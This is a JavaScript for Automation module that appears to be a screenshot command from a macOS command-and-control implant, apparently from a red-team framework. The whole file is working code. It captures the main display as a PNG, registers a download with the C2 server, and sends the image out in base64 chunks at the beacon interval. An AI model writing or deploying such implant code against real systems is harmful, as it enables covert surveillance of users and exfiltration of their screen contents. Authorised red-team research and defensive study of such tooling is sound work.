exports.screencapture = function(task, command, params){
    try{
        ObjC.import('Cocoa');
        ObjC.import('AppKit');
        var cgimage = $.CGDisplayCreateImage($.CGMainDisplayID());
        if(cgimage.js == undefined){
          return "Failed to get image from display";
        }
        var bitmapimagerep = $.NSBitmapImageRep.alloc.initWithCGImage(cgimage);
        var capture = bitmapimagerep.representationUsingTypeProperties($.NSBitmapImageFileTypePNG, Ref());
        var offset = 0;
        var chunkSize = 350000;
        var fileSize = parseInt(capture.length);
        // always round up to account for chunks that are < chunksize;
        var numOfChunks = Math.ceil(fileSize / chunkSize);
        var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
        var registerData = convert_to_nsdata(registerData);
        var registerFile = C2.postResponse(task, registerData);
        if (registerFile['status'] == "success"){
            var currentChunk = 1;
            var csize = capture.length - offset > chunkSize ? chunkSize : capture.length - offset;
            var data = capture.subdataWithRange($.NSMakeRange(offset, csize));
            while(parseInt(data.length) > 0 && offset < fileSize){
                // send a chunk
                var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['file_id']});
                fileData = convert_to_nsdata(fileData);
                C2.postResponse(task, fileData);
                $.NSThread.sleepForTimeInterval(C2.getInterval());

                // increment the offset and seek to the amount of data read from the file
                offset = offset + parseInt(data.length);
                var csize = capture.length - offset > chunkSize ? chunkSize : capture.length - offset;
                var data = capture.subdataWithRange($.NSMakeRange(offset, csize));
                currentChunk += 1;
            }
            var output = "Finished downloading file with id: " + registerFile['file_id'];
        }
        else{
           var output = "Failed to register file to download";
        }
        return output;
    }catch(error){
        return "Failed to get a screencapture: " + error.toString();
    }
};
COMMAND_ENDS_HERE